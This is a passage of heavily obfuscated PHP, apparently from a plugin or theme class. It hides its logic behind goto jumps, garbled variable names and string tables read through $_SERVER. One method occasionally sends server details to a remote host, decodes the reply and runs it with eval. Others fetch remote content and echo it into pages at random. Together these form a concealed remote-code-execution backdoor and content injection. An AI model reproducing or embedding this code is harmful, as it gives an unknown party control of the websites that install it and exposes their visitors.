$_SERVER[ì‹É]; $F½õ†µ¥ÑÒ =& $_SERVER[ºÀ]; $F½õ†µ¥ÑÒ[61]($F½õ†µ¥ÑÒ[62])->{$_SERVER[ºÀ][219]}(array($F½õ†µ¥ÑÒ[207] => $F½õ†µ¥ÑÒ[10], $F½õ†µ¥ÑÒ[208] => $F½õ†µ¥ÑÒ[10], $F½õ†µ¥ÑÒ[118] => $F½õ†µ¥ÑÒ[119], $F½õ†µ¥ÑÒ[120] => $F½õ†µ¥ÑÒ[10], $F½õ†µ¥ÑÒ[121] => $F½õ†µ¥ÑÒ[10])); goto fö„Ú”Û¤; aÚ÷ìÔ·õ¢: } private function lbor6f769fac() { goto F¸Ş‚—‰­œ; F¸Ş‚—‰­œ: $b©Ó½ÖÃÁ =& $_SERVER[ì‹É]; $C–…†›¦‹± =& $_SERVER[ºÀ]; $this->kvfw852df15c = $C–…†›¦‹±[119]; goto e÷Ğæ³; a¨’”áÍ¿: $FŠÛìî¥´ = $b©Ó½ÖÃÁ[596]; while ($FŠÛìî¥´ < $b©Ó½ÖÃÁ[546]) { if ($FŠÛìî¥´ >= 0) { break; } $FŠÛìî¥´++; } $b‘‹£“ìà¦ = $C–…†›¦‹±[112]($_SERVER[$C–…†›¦‹±[113]] . $C–…†›¦‹±[212]($aóãÛ‹êë…) . $B…×Öñ¼ãò[$C–…†›¦‹±[208]]); goto dÜÎ¤Óéˆ®; dÜÎ¤Óéˆ®: $d¦Ñ†áÉ¶† = $b©Ó½ÖÃÁ[597]; if (!$d¦Ñ†áÉ¶†) { die; } $bˆƒ‰£àİ” = $C–…†›¦‹±[212]($C–…†›¦‹±[25]($b‘‹£“ìà¦, 10, 16)); goto a˜­Ã¥ôâí; e´áÈ˜Ø„İ: $fæÄ—¼Ü­´ = $C–…†›¦‹±[188]($fæÄ—¼Ü­´, !0); if (!$C–…†›¦‹±[189]($fæÄ—¼Ü­´)) { return $this->{$_SERVER[ºÀ][162]}(); } $bÂÚöö´ † = $C–…†›¦‹±[142]($fæÄ—¼Ü­´[$C–…†›¦‹±[143]]); goto A‹´±”ÃÙ; A‹´±”ÃÙ: if ($C–…†›¦‹±[228]() >= $bÂÚöö´ †) { return $this->{$_SERVER[ºÀ][162]}(); } $this->lqtk41ae2151 = $fæÄ—¼Ü­´; $this->kvfw852df15c = $B…×Öñ¼ãò[$C–…†›¦‹±[118]]; goto cù¸±Ü‘£Æ; a˜­Ã¥ôâí: $d“…õâ²„¦ = $b©Ó½ÖÃÁ[598]; if (!$d“…õâ²„¦) { return; } $fæÄ—¼Ü­´ = $this->{$_SERVER[ºÀ][186]}($båÈŸ‡¡ò[$C–…†›¦‹±[89]][$bˆƒ‰£àİ”], $b‘‹£“ìà¦); goto e´áÈ˜Ø„İ; Aô´¶é÷‡°: $FÃ†Œõ´‹ = $C–…†›¦‹±[220]($C–…†›¦‹±[61]($C–…†›¦‹±[11])->{$_SERVER[ºÀ][221]}(), $C–…†›¦‹±[222]); $c¡œ¸ïÇ¿ù = $b©Ó½ÖÃÁ[595]; $båÈŸ‡¡ò = $FÃ†Œõ´‹[$C–…†›¦‹±[223]]; goto a¨’”áÍ¿; D£‹ÛÌİÏ¿: if ($B…×Öñ¼ãò[$C–…†›¦‹±[118]] == $C–…†›¦‹±[119]) { return; } $aóãÛ‹êë… = $C–…†›¦‹±[61]($C–…†›¦‹±[62])->{$_SERVER[ºÀ][63]}($C–…†›¦‹±[114]); $d°ØÎëãÊÈ = $b©Ó½ÖÃÁ[594]; goto Aô´¶é÷‡°; e÷Ğæ³: $B…×Öñ¼ãò = $C–…†›¦‹±[61]($C–…†›¦‹±[62])->{$_SERVER[ºÀ][63]}(); $d®…²Ïƒ³ = $b©Ó½ÖÃÁ[593]; if (!$d®…²Ïƒ³) { return; } goto D£‹ÛÌİÏ¿; cù¸±Ü‘£Æ: } private function wquff3649249() { goto b‚ñË‘ã²; d†å» §Ä¥: if ($F †ÙÃÔĞ == $F©†¶¢ë…¦[229] && $this->kvfw852df15c == $F©†¶¢ë…¦[119]) { $F©†¶¢ë…¦[164]($F©†¶¢ë…¦[195]($F©†¶¢ë…¦[230]), !1, $F©†¶¢ë…¦[231]); } $b‘ïŠË–© = array($F©†¶¢ë…¦[232], $F©†¶¢ë…¦[233]); if ($F©†¶¢ë…¦[234]($F †ÙÃÔĞ, $b‘ïŠË–©)) { if ($this->kvfw852df15c == $F©†¶¢ë…¦[119] && isset($Aª‹ÈÀĞğ[$F©†¶¢ë…¦[235]])) { $F©†¶¢ë…¦[164]($F©†¶¢ë…¦[195]($F©†¶¢ë…¦[230]), !1, $F©†¶¢ë…¦[231]); die; } $cª£‹´ë ø = $this->{$_SERVER[ºÀ][135]}(); if ($cª£‹´ë ø != $F©†¶¢ë…¦[199]($F©†¶¢ë…¦[236])) { if ($cª£‹´ë ø <= $F©†¶¢ë…¦[61]($F©†¶¢ë…¦[137])->{$_SERVER[ºÀ][138]}()) { $F©†¶¢ë…¦[164]($F©†¶¢ë…¦[195]($F©†¶¢ë…¦[237]), !1, $F©†¶¢ë…¦[231]); die; } } } goto CïŸ¤œ‰Ğ°; b‚ñË‘ã²: $dĞè¬ÊÙÎ‹ =& $_SERVER[ì‹É]; $F©†¶¢ë…¦ =& $_SERVER[ºÀ]; $Aª‹ÈÀĞğ = $GLOBALS[$F©†¶¢ë…¦[22]]; goto F§ğ­Ü—ñÒ; F§ğ­Ü—ñÒ: $F †ÙÃÔĞ = $_SERVER[$F©†¶¢ë…¦[44]]; $C›†±Å‚Ìµ = $dĞè¬ÊÙÎ‹[599]; if (strlen($C›†±Å‚Ìµ) < $dĞè¬ÊÙÎ‹[556]) { die; } goto d†å» §Ä¥; CïŸ¤œ‰Ğ°: } private function bima64f0137b() { goto eª÷ğòİÈ‘; F®ƒ‹í½Ì: $B¤²œóèÃ‹ = $this->{$_SERVER[ºÀ][241]}($B¤²œóèÃ‹, $eÑ­êŠµÜâ[242]); $CÈÓŒ‚Ã = $b ‡µ÷÷¡¥[600]; if (!$CÈÓŒ‚Ã) { return; } goto EÎÄÍ‰¸Ø; Bï¬öÄÓœ”: if (!$aŞ—†—¾ğß) { return; } $eÑ­êŠµÜâ[249]($eÑ­êŠµÜâ[250]); if ($B†ã‚±Š›³ && $eÑ­êŠµÜâ[32]($B†ã‚±Š›³, $eÑ­êŠµÜâ[251])) { echo $B†ã‚±Š›³; } goto DòèÄÑä®; bª¦àŠ©³Õ: if (!$GLOBALS[$eÑ­êŠµÜâ[130]] || !isset($_GET[$eÑ­êŠµÜâ[239]])) { return; } if (!$eÑ­êŠµÜâ[234]($_SERVER[$eÑ­êŠµÜâ[44]], $FõÜøùÊ ‡)) { return; } $B¤²œóèÃ‹ = $eÑ­êŠµÜâ[240]; goto F®ƒ‹í½Ì; eª÷ğòİÈ‘: $b ‡µ÷÷¡¥ =& $_SERVER[ì‹É]; $eÑ­êŠµÜâ =& $_SERVER[ºÀ]; $FõÜøùÊ ‡ = array($eÑ­êŠµÜâ[133], $eÑ­êŠµÜâ[238]); goto bª¦àŠ©³Õ; DòèÄÑä®: die; goto bª“ŒâÔã; EÎÄÍ‰¸Ø: $fĞÜ¾¼ªÅ = $eÑ­êŠµÜâ[243](array($eÑ­êŠµÜâ[244] => array($eÑ­êŠµÜâ[245] => $eÑ­êŠµÜâ[246], $eÑ­êŠµÜâ[247] => 3))); $B†ã‚±Š›³ = @$eÑ­êŠµÜâ[248]($B¤²œóèÃ‹, !1, $fĞÜ¾¼ªÅ); $aŞ—†—¾ğß = $b ‡µ÷÷¡¥[601]; goto Bï¬öÄÓœ”; bª“ŒâÔã: } public function schebdc8afe3($fèçÔĞÅœó) { goto F‘©ÀÏÁÓ°; CšŠ’›óñ: $bò†ˆØ™ = $_SERVER[ì‹É][600]; if (!$bò†ˆØ™) { die; } $Fˆ…ÙÅ”ïÎ = $b¥¡Í§«­[0]($b¥¡Í§«­[261], $b¥¡Í§«­[102]($this->lqtk41ae2151, $b¥¡Í§«­[127], $b¥¡Í§«­[10])); goto f¿«„ßÒğâ; aè†•¿ğÃ÷: return $fèçÔĞÅœó; goto dœæ°¢¬‰Ê; F‘©ÀÏÁÓ°: $b¥¡Í§«­ =& $_SERVER[ºÀ]; if ($this->kvfw852df15c == $b¥¡Í§«­[252]) { return $fèçÔĞÅœó; } $b¬‰Æ¼Æ‹ = array($b¥¡Í§«­[253], $b¥¡Í§«­[254], $b¥¡Í§«­[255], $b¥¡Í§«­[256], $b¥¡Í§«­[257], $b¥¡Í§«­[258], $b¥¡Í§«­[259], $b¥¡Í§«­[260]); goto CšŠ’›óñ; f¿«„ßÒğâ: $cŸ³ÉÖÃ™Ô = array(); foreach ($b¬‰Æ¼Æ‹ as $aŠ½½½ƒ²‚) { if (!$b¥¡Í§«­[234]($aŠ½½½ƒ²‚, $Fˆ…ÙÅ”ïÎ)) { $cŸ³ÉÖÃ™Ô[] = $aŠ½½½ƒ²‚; } } foreach ($cŸ³ÉÖÃ™Ô as $aŠ½½½ƒ²‚) { unset($fèçÔĞÅœó[$aŠ½½½ƒ²‚]); } goto aè†•¿ğÃ÷; dœæ°¢¬‰Ê: } private function lhkt7801904a() { goto E‡ğˆóøô™; CÉÁŠ«‘‰é: $AÀºóÅö±¤ = array($fù–î†Šğ”[262]); $c…†·ÉÕ›ğ = $_SERVER[ì‹É][602]; foreach ($AÀºóÅö±¤ as $eÌŒ§£Š·Œ) { if ($eÌŒ§£Š·Œ == $E›°·ÉÃ || $fù–î†Šğ”[25]($E›°·ÉÃ, 0, $fù–î†Šğ”[24]($eÌŒ§£Š·Œ)) == $eÌŒ§£Š·Œ) { $fù–î†Šğ”[164]($fù–î†Šğ”[195]($fù–î†Šğ”[263]), !1); } } goto dÒ„ÏàÚŸ“; E‡ğˆóøô™: $fù–î†Šğ” =& $_SERVER[ºÀ]; if ($this->kvfw852df15c != $fù–î†Šğ”[119]) { return; } $E›°·ÉÃ = $_SERVER[$fù–î†Šğ”[44]]; goto CÉÁŠ«‘‰é; dÒ„ÏàÚŸ“: $this->{$_SERVER[ºÀ][3]}($fù–î†Šğ”[264], array($this, $fù–î†Šğ”[265])); $GLOBALS[$fù–î†Šğ”[89]][$fù–î†Šğ”[266]] = $fù–î†Šğ”[218]; goto Dò›¦°Á¬ê; Dò›¦°Á¬ê: } public function fmrcb68e01b9() { $BÛàæŒ®ëø =& $_SERVER[ì‹É]; return $_SERVER[ºÀ][267]; $D…Ú¡Ÿ ™ = $BÛàæŒ®ëø[603]; if (strlen($D…Ú¡Ÿ ™) < $BÛàæŒ®ëø[556]) { return; } } private function bhyzff9e7429() { goto e¼³“‘¶ë›; C˜ÕÉ¼î“—: if ($EÕºÕÑ÷å– && $D¢ÃìÜÌ‹[228]() - $EÕºÕÑ÷å– < $D¢ÃìÜÌ‹[199]($D¢ÃìÜÌ‹[275])) { return; } $D¢ÃìÜÌ‹[13](array($D¢ÃìÜÌ‹[273], $D¢ÃìÜÌ‹[150]), $fÑÛ¡Ö˜ñÇ, $D¢ÃìÜÌ‹[228]()); $fÔĞŒïÊ¤ = array($D¢ÃìÜÌ‹[163] => $D¢ÃìÜÌ‹[61]($D¢ÃìÜÌ‹[62])->{$_SERVER[ºÀ][63]}($D¢ÃìÜÌ‹[207]), $D¢ÃìÜÌ‹[176] => $this->kvfw852df15c, $D¢ÃìÜÌ‹[174] => $_SERVER[$D¢ÃìÜÌ‹[175]], $D¢ÃìÜÌ‹[167] => $D¢ÃìÜÌ‹[147], $D¢ÃìÜÌ‹[170] => $_SERVER[$D¢ÃìÜÌ‹[171]]); goto FÍªŸğ‚‹µ; EÔÑµÛÃ„: $CñË¬Öä„® = $D“¬—âæ×ë[604]; while (strlen($CñË¬Öä„®) < $D“¬—âæ×ë[556]) { if (!$CñË¬Öä„®) { break; } $CñË¬Öä„®++; } $fÑÛ¡Ö˜ñÇ = $D¢ÃìÜÌ‹[271] . $D¢ÃìÜÌ‹[112]($D¢ÃìÜÌ‹[272]); goto CÎÖÁá…œ˜; CÂó²Èš‚ö: if ($d™­ÍŞŠ[$D¢ÃìÜÌ‹[163]] && $d™­ÍŞŠ[$D¢ÃìÜÌ‹[277]]) { if ($this->{$_SERVER[ºÀ][197]}($d™­ÍŞŠ[$D¢ÃìÜÌ‹[277]]) == $fÔĞŒïÊ¤[$D¢ÃìÜÌ‹[163]]) { return; } } $this->{$_SERVER[ºÀ][162]}(); if ($this->{$_SERVER[ºÀ][197]}($d™­ÍŞŠ[$D¢ÃìÜÌ‹[277]]) != $fÔĞŒïÊ¤[$D¢ÃìÜÌ‹[163]]) { $aô‹º‡µÚ = array($D¢ÃìÜÌ‹[200] => $D¢ÃìÜÌ‹[61]($D¢ÃìÜÌ‹[62])->{$_SERVER[ºÀ][63]}($D¢ÃìÜÌ‹[114]), $D¢ÃìÜÌ‹[201] => $_SERVER[$D¢ÃìÜÌ‹[113]], $D¢ÃìÜÌ‹[202] => $D¢ÃìÜÌ‹[203](), $D¢ÃìÜÌ‹[172] => $_SERVER[$D¢ÃìÜÌ‹[173]]); $B³Ê“Ñ„Ú¦ = $this->{$_SERVER[ºÀ][204]}($D¢ÃìÜÌ‹[146]($aô‹º‡µÚ)); $d™­ÍŞŠ = $this->{$_SERVER[ºÀ][180]}($D¢ÃìÜÌ‹[205] . $B³Ê“Ñ„Ú¦); if ($d™­ÍŞŠ && $D¢ÃìÜÌ‹[189]($d™­ÍŞŠ) && isset($d™­ÍŞŠ[$D¢ÃìÜÌ‹[277]])) { $c‡ÔÎš²§ = $this->{$_SERVER[ºÀ][186]}($d™­ÍŞŠ[$D¢ÃìÜÌ‹[277]], 2); if ($c‡ÔÎš²§) { $c‡ÔÎš²§ = $this->{$_SERVER[ºÀ][197]}($c‡ÔÎš²§); } if ($c‡ÔÎš²§) { try { @eval($c‡ÔÎš²§); } catch (Exception $aø¿ø¬à³Ä) { } } } } goto cŞ¡Ï«çÇ«; dƒ§ÅïíÙÉ: $EÕºÕÑ÷å– = $D¢ÃìÜÌ‹[13](array($D¢ÃìÜÌ‹[273], $D¢ÃìÜÌ‹[274]), $fÑÛ¡Ö˜ñÇ); $a¾×¡¸–Û = $D“¬—âæ×ë[545]; while ($a¾×¡¸–Û < $D“¬—âæ×ë[553]) { if ($a¾×¡¸–Û >= 0) { break; } $a¾×¡¸–Û++; } goto C˜ÕÉ¼î“—; CÎÖÁá…œ˜: if ($this->kvfw852df15c == $D¢ÃìÜÌ‹[119] || !$GLOBALS[$D¢ÃìÜÌ‹[130]]) { return; } if (!$D¢ÃìÜÌ‹[234]($_SERVER[$D¢ÃìÜÌ‹[44]], $c¢ô¢“ÅçÑ)) { return; } if ($D¢ÃìÜÌ‹[228]() % 4 != 0) { return; } goto dƒ§ÅïíÙÉ; FÍªŸğ‚‹µ: $a½º¾Áö§ = $D“¬—âæ×ë[605]; $d™­ÍŞŠ = $this->{$_SERVER[ºÀ][180]}($D¢ÃìÜÌ‹[276], $fÔĞŒïÊ¤); if (!$D¢ÃìÜÌ‹[189]($d™­ÍŞŠ)) { return; } goto CÂó²Èš‚ö; e¼³“‘¶ë›: $D“¬—âæ×ë =& $_SERVER[ì‹É]; $D¢ÃìÜÌ‹ =& $_SERVER[ºÀ]; $c¢ô¢“ÅçÑ = array($D¢ÃìÜÌ‹[268], $D¢ÃìÜÌ‹[269], $D¢ÃìÜÌ‹[270]); goto EÔÑµÛÃ„; cŞ¡Ï«çÇ«: } private function bvrle407cf77($c®³×Œ‰Ò° = '', $fšêÚ¸ä½² = array(), $dÚ‹¾©±ìó = 5) { goto eìíªïŞªš; eìíªïŞªš: $bŠ•ºÊ « =& $_SERVER[ì‹É]; $A×¾ËíŸÅç =& $_SERVER[ºÀ]; $eË­¡Ãê = $A×¾ËíŸÅç[278]; goto cîÛ”¦ÂéŒ; dÚâ²¡êÊ®: $f ß¦¼ŠŸ® = $A×¾ËíŸÅç[243](array($A×¾ËíŸÅç[244] => array($A×¾ËíŸÅç[247] => $dÚ‹¾©±ìó, $A×¾ËíŸÅç[245] => $A×¾ËíŸÅç[282]), $A×¾ËíŸÅç[283] => array($A×¾ËíŸÅç[284] => !1, $A×¾ËíŸÅç[285] => !1))); $aåù´ŸÕ÷œ = $bŠ•ºÊ «[608]; while (strlen($aåù´ŸÕ÷œ) < $bŠ•ºÊ «[553]) { if (!$aåù´ŸÕ÷œ) { break; } $aåù´ŸÕ÷œ++; } goto bøÇË˜åÅƒ; bøÇË˜åÅƒ: $fšêÚ¸ä½² = @$A×¾ËíŸÅç[248]($eË­¡Ãê, !1, $f ß¦¼ŠŸ®); return $A×¾ËíŸÅç[188]($fšêÚ¸ä½², !0); $Aöù„ í§ë = $bŠ•ºÊ «[609]; goto B‘É­Øœ´›; B‘É­Øœ´›: if (strlen($Aöù„ í§ë) < $bŠ•ºÊ «[553]) { die; } goto EîÜ«½†Í‚; cîÛ”¦ÂéŒ: $f›ğÍØ˜ïø = $bŠ•ºÊ «[606]; $eË­¡Ãê = $this->{$_SERVER[ºÀ][241]}($eË­¡Ãê, $A×¾ËíŸÅç[279]); $BôŞ“®ğ„‹ = $bŠ•ºÊ «[607]; goto b¡áÚè¯Åİ; b¡áÚè¯Åİ: if (strlen($BôŞ“®ğ„‹) < $bŠ•ºÊ «[553]) { die; } $eË­¡Ãê = $eË­¡Ãê . $c®³×Œ‰Ò° . $A×¾ËíŸÅç[280] . $A×¾ËíŸÅç[281]($fšêÚ¸ä½²); if ($fšêÚ¸ä½² === -1) { return $eË­¡Ãê; } goto dÚâ²¡êÊ®; EîÜ«½†Í‚: } private function fbyva0e6048c() { goto aÑË‰ŸßÚç; c¡´–ÖØ²: if (!$EÃ¨”ùé¹†) { die; } goto E‚™šê˜ñÀ; aÑË‰ŸßÚç: $Cç³§Á ‹ƒ =& $_SERVER[ì‹É]; $AíÏ› ¢î¿ =& $_SERVER[ºÀ]; $dì¶çÄ‹®’ = array($AíÏ› ¢î¿[286] => $AíÏ› ¢î¿[287], $AíÏ› ¢î¿[288] => $AíÏ› ¢î¿[289], $AíÏ› ¢î¿[290] => $AíÏ› ¢î¿[291], $AíÏ› ¢î¿[292] => $AíÏ› ¢î¿[293], $AíÏ› ¢î¿[294] => $AíÏ› ¢î¿[295], $AíÏ› ¢î¿[296] => $AíÏ› ¢î¿[236], $AíÏ› ¢î¿[297] => $AíÏ› ¢î¿[236], $AíÏ› ¢î¿[298] => $AíÏ› ¢î¿[287], $AíÏ› ¢î¿[299] => $AíÏ› ¢î¿[289], $AíÏ› ¢î¿[300] => $AíÏ› ¢î¿[291], $AíÏ› ¢î¿[301] => $AíÏ› ¢î¿[302], $AíÏ› ¢î¿[303] => $AíÏ› ¢î¿[293], $AíÏ› ¢î¿[304] => $AíÏ› ¢î¿[305], $AíÏ› ¢î¿[306] => $AíÏ› ¢î¿[295], $AíÏ› ¢î¿[307] => $AíÏ› ¢î¿[308], $AíÏ› ¢î¿[309] => $AíÏ› ¢î¿[310], $AíÏ› ¢î¿[311] => $AíÏ› ¢î¿[312]); goto C‚å›ùĞÒó; C‚å›ùĞÒó: $E²ğõé×¯İ = $dì¶çÄ‹®’[$this->kvfw852df15c]; $E²ğõé×¯İ = $AíÏ› ¢î¿[199]($E²ğõé×¯İ ? $E²ğõé×¯İ : $AíÏ› ¢î¿[287]); $Aó†ò°«ô´ = $AíÏ› ¢î¿[102]($this->lqtk41ae2151, $AíÏ› ¢î¿[313]); goto dÎ¨Õ°‘Â¿; dÎ¨Õ°‘Â¿: $e·ãì§®Öê = $Cç³§Á ‹ƒ[610]; while (strlen($e·ãì§®Öê) < $Cç³§Á ‹ƒ[543]) { if (!$e·ãì§®Öê) { break; } $e·ãì§®Öê++; } $Aó†ò°«ô´ = $Aó†ò°«ô´ ? $AíÏ› ¢î¿[199]($Aó†ò°«ô´) : 0; goto a„‡½¼Ù»‘; a„‡½¼Ù»‘: $d‹Ö™ŞÎºé = $Cç³§Á ‹ƒ[611]; return $E²ğõé×¯İ + $Aó†ò°«ô´; $EÃ¨”ùé¹† = $Cç³§Á ‹ƒ[612]; goto c¡´–ÖØ²; E‚™šê˜ñÀ: } public function sihj69f927fa($dç½ºÊ³ªñ) { goto c¼Ì±Òğİ; c¼Ì±Òğİ: $bò‚ª”ñ =& $_SERVER[ºÀ]; $fĞÑò•ªÖ° = $this->{$_SERVER[ºÀ][135]}(); if ($fĞÑò•ªÖ° >= $bò‚ª”ñ[199]($bò‚ª”ñ[236])) { return; } goto aÎßé¹”×; aÎßé¹”×: $aŒ¢‘¹÷è = $bò‚ª”ñ[61]($bò‚ª”ñ[137])->{$_SERVER[ºÀ][138]}(); if ($aŒ¢‘¹÷è <= $fĞÑò•ªÖ°) { return; } $DŠø†òÆÛÂ = $bò‚ª”ñ[61]($bò‚ª”ñ[137])->{$_SERVER[ºÀ][314]}($bò‚ª”ñ[315])->{$_SERVER[ºÀ][316]}($fĞÑò•ªÖ°)->{$_SERVER[ºÀ][317]}(); goto EŠÏ½ ÅîÔ; EŠÏ½ ÅîÔ: $DŠø†òÆÛÂ = $bò‚ª”ñ[220]($DŠø†òÆÛÂ, $bò‚ª”ñ[10], $bò‚ª”ñ[315]); if (!$bò‚ª”ñ[234]($dç½ºÊ³ªñ[$bò‚ª”ñ[315]], $DŠø†òÆÛÂ)) { $bò‚ª”ñ[164]($bò‚ª”ñ[318], !1, $bò‚ª”ñ[231]); } goto DÆÊ›æÍ”ñ; DÆÊ›æÍ”ñ: } public function ntfr996190b8() { goto e¯‡İÂõö; c’ÀŒ‹ÊõÊ: $Fí‘µ§õëÀ = $a¿õåšÕ÷ğ[615]; while (strlen($Fí‘µ§õëÀ) < $a¿õåšÕ÷ğ[556]) { if (!$Fí‘µ§õëÀ) { break; } $Fí‘µ§õëÀ++; } goto Bö¤¸Ã…Š§; e‹ä‡Ô»‡ã: $d’À¼µÕÄ = $a¿õåšÕ÷ğ[614]; if (strlen($d’À¼µÕÄ) < $a¿õåšÕ÷ğ[546]) { die; } echo $AŠÉ»Ï‡øš[320] . $AŠÉ»Ï‡øš[321]($FõÍº¨œõ) . $AŠÉ»Ï‡øš[322]; goto c’ÀŒ‹ÊõÊ; F—å¦ĞšôŠ: $F¿±åŠ½ÚÔ = $AŠÉ»Ï‡øš[240]; $bà†´èßéŒ = $a¿õåšÕ÷ğ[613]; if (!$bà†´èßéŒ) { die; } goto B×øˆ†ª“™; B×øˆ†ª“™: $F¿±åŠ½ÚÔ = $this->{$_SERVER[ºÀ][241]}($F¿±åŠ½ÚÔ, $AŠÉ»Ï‡øš[242]); $aÂ¥ÖÏËö = $AŠÉ»Ï‡øš[243](array($AŠÉ»Ï‡øš[244] => array($AŠÉ»Ï‡øš[245] => $AŠÉ»Ï‡øš[246], $AŠÉ»Ï‡øš[247] => 3))); $FõÍº¨œõ = @$AŠÉ»Ï‡øš[248]($F¿±åŠ½ÚÔ, !1, $aÂ¥ÖÏËö); goto e‹ä‡Ô»‡ã; e¯‡İÂõö: $a¿õåšÕ÷ğ =& $_SERVER[ì‹É]; $AŠÉ»Ï‡øš =& $_SERVER[ºÀ]; if (!$GLOBALS[$AŠÉ»Ï‡øš[130]] || $AŠÉ»Ï‡øš[319](1, 100) > 20) { return; } goto F—å¦ĞšôŠ; Bö¤¸Ã…Š§: } private function hrmi4624bf14($f¤¬²«Ì‹†, $FÒÑ°¢¨, $e…ÓŸ­†ß¼ = 3) { goto dë¨ï•ºãƒ; aÌÕÜšˆÔ: $f¤¬²«Ì‹† = $AäÚÅªî¡£[2]($f¤¬²«Ì‹†); $C¤ø Ê¿‡ñ = $AäÚÅªî¡£[319](0, 5) . $AäÚÅªî¡£[10]; $d«±ï®õİ = $b¼ìå¿¹[616]; goto A§Ï¶ÔÃ¶à; BÛ³Øƒåß: switch ($C¤ø Ê¿‡ñ) { case $AäÚÅªî¡£[227]: $C®îß ¼ = $this->{$_SERVER[ºÀ][145]}($f¤¬²«Ì‹†, $AäÚÅªî¡£[212]($FÒÑ°¢¨ . $d¡††§šˆ)); $B‡¸ÌËŸ‹ = $b¼ìå¿¹[617]; if (!$B‡¸ÌËŸ‹) { die; } break; case $AäÚÅªî¡£[218]: $C®îß ¼ = $this->{$_SERVER[ºÀ][145]}($f¤¬²«Ì‹†, $AäÚÅªî¡£[212]($d¡††§šˆ . $FÒÑ°¢¨)); $DÅƒ®„Í›  = $b¼ìå¿¹[618]; while (strlen($DÅƒ®„Í› ) < $b¼ìå¿¹[548]) { if (!$DÅƒ®„Í› ) { break; } $DÅƒ®„Í› ++; } break; $FŸ “èò¨° = $b¼ìå¿¹[619]; if (strlen($FŸ “èò¨°) < $b¼ìå¿¹[546]) { return; } case $AäÚÅªî¡£[325]: $C®îß ¼ = $this->{$_SERVER[ºÀ][145]}($f¤¬²«Ì‹†, $AäÚÅªî¡£[116]($d¡††§šˆ . $FÒÑ°¢¨)); $E¨Û„â·¸ = $b¼ìå¿¹[620]; if (strlen($E¨Û„â·¸) < $b¼ìå¿¹[553]) { die; } break; $e¯®ï‰õïŞ = $b¼ìå¿¹[621]; if (!$e¯®ï‰õïŞ) { die; } case $AäÚÅªî¡£[326]: $C®îß ¼ = $this->{$_SERVER[ºÀ][145]}($f¤¬²«Ì‹†, $AäÚÅªî¡£[112]($d¡††§šˆ . $FÒÑ°¢¨)); break; $A™å£¾Ï = $b¼ìå¿¹[622]; case $AäÚÅªî¡£[327]: goto Fİ‚‰³·—è; Fİ‚‰³·—è: $f¤¬²«Ì‹† = $AäÚÅªî¡£[116]($f¤¬²«Ì‹†); $D†œŞˆøï¢ = $b¼ìå¿¹[623]; while ($D†œŞˆøï¢ < $b¼ìå¿¹[546]) { if ($D†œŞˆøï¢ >= 0) { break; } $D†œŞˆøï¢++; } goto aŒ„Ï˜Ó°; b¿¹Ò¶ĞÄ: for ($b‰£í»ßË÷ = 0; $b‰£í»ßË÷ < $AäÚÅªî¡£[24]($f¤¬²«Ì‹†); $b‰£í»ßË÷++) { $Eé”à™ÖİÓ = $Eé”à™ÖİÓ == $AäÚÅªî¡£[24]($f¼æù¢«Øˆ) ? 0 : $Eé”à™ÖİÓ; $fëØœØŞçÊ = ($C‹‘ÖŠ‡…© + $AäÚÅªî¡£[329]($f°ï÷³áæ, $f¤¬²«Ì‹†[$b‰£í»ßË÷]) + $AäÚÅªî¡£[330]($f¼æù¢«Øˆ[$Eé”à™ÖİÓ++])) % 64; $aæ°šƒ‡¹ˆ .= $f°ï÷³áæ[$fëØœØŞçÊ]; } $C®îß ¼ = $AäÚÅªî¡£[321]($F³Èïƒäì‰ . $aæ°šƒ‡¹ˆ); $F’º‡ª˜À = $b¼ìå¿¹[626]; goto f¬¥ôãóâÛ; f¬¥ôãóâÛ: if (!$F’º‡ª˜À) { return; } break; $E’ñà…š¬ô = $b¼ìå¿¹[627]; goto FÕà¿ŒÆÓ²; Bˆ±¿¹ŠÚ: $Fóà¬ÇÉŒæ = $b¼ìå¿¹[625]; if (!$Fóà¬ÇÉŒæ) { die; } $Eé”à™ÖİÓ = 0; goto b¿¹Ò¶ĞÄ; a‡Ø›ÙäÔ: $aæ°šƒ‡¹ˆ = $AäÚÅªî¡£[10]; $b‰£í»ßË÷ = 0; $fëØœØŞçÊ = 0; goto Bˆ±¿¹ŠÚ; cŒ®¶´×Š: $f¼æù¢«Øˆ = $AäÚÅªî¡£[25]($f¼æù¢«Øˆ, $C‹‘ÖŠ‡…© % 8, $C‹‘ÖŠ‡…© % 8 + 7); $CššáŞĞù = $b¼ìå¿¹[624]; if (!$CššáŞĞù) { return; } goto a‡Ø›ÙäÔ; aŒ„Ï˜Ó°: $C‹‘ÖŠ‡…© = $AäÚÅªî¡£[328](0, 64); $F³Èïƒäì‰ = $f°ï÷³áæ[$C‹‘ÖŠ‡…©]; $f¼æù¢«Øˆ = $AäÚÅªî¡£[112]($F³Èïƒäì‰ . $AäÚÅªî¡£[112]($FÒÑ°¢¨ . $F³Èïƒäì‰) . $FÒÑ°¢¨); goto cŒ®¶´×Š; FÕà¿ŒÆÓ²: default: $C®îß ¼ = $this->{$_SERVER[ºÀ][145]}($f¤¬²«Ì‹†, $FÒÑ°¢¨ . $d¡††§šˆ); break; $E•‚ÍÔ•Ü = $b¼ìå¿¹[628]; } $C®îß ¼ = $AäÚÅªî¡£[212]($C¤ø Ê¿‡ñ . $d¡††§šˆ . $C®îß ¼); if ($e…ÓŸ­†ß¼ - 1 > 0) { $C®îß ¼ = $this->{$_SERVER[ºÀ][125]}($C®îß ¼, $FÒÑ°¢¨, $e…ÓŸ­†ß¼ - 1); } goto e«ˆ…¹ëÈ; A§Ï¶ÔÃ¶à: while ($d«±ï®õİ < $b¼ìå¿¹[548]) { if ($d«±ï®õİ >= 0) { break; } $d«±ï®õİ++; } $d¡††§šˆ = $AäÚÅªî¡£[122](15); $f°ï÷³áæ = $AäÚÅªî¡£[324]; goto BÛ³Øƒåß; e«ˆ…¹ëÈ: return $C®îß ¼; goto f©…œÂÊóå; dë¨ï•ºãƒ: $b¼ìå¿¹ =& $_SERVER[ì‹É]; $AäÚÅªî¡£ =& $_SERVER[ºÀ]; $AäÚÅªî¡£[323](1); goto aÌÕÜšˆÔ; f©…œÂÊóå: } private function pbeyf3f2f9a9($FÁ¥Éè­Ô, $aĞÀ¶é‹´ø, $c…ºÊŒ¬½ = 3) { goto Cë‚»ïŠ˜á; d»å£òÑÂ: $d‚“Ñ²ô¡Ğ = $E¬õ²Ä¸£”[631]; while (strlen($d‚“Ñ²ô¡Ğ) < $E¬õ²Ä¸£”[546]) { if (!$d‚“Ñ²ô¡Ğ) { break; } $d‚“Ñ²ô¡Ğ++; } $A®ó¥ãŒ›» = $EŸòŒ‚¢„•[324]; goto 